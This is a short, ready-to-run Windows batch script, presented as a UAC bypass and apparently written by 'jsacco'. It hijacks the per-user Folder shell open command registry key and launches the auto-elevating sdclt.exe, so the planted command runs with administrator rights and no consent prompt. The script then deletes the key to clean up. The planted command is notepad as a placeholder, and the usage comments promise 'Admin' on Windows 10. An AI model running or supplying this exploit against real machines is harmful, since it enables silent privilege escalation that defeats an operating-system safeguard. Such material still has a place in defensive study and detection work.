# Author: jsacco
# How to use:
# 1. Copy the batch into run.bat
# 2. Run it!
# 3. Admin
# Tested on Windows 10
@echo off
echo UAC-Bypass by jsacco
reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "cmd.exe /c notepad.exe" /f && reg add HKCU\Software\Classes\Folder\shell\open\command /v "DelegateExecute" /f
sdclt.exe
echo Cleanining..
reg delete "HKCU\Software\Classes\Folder\shell\open\command" /f
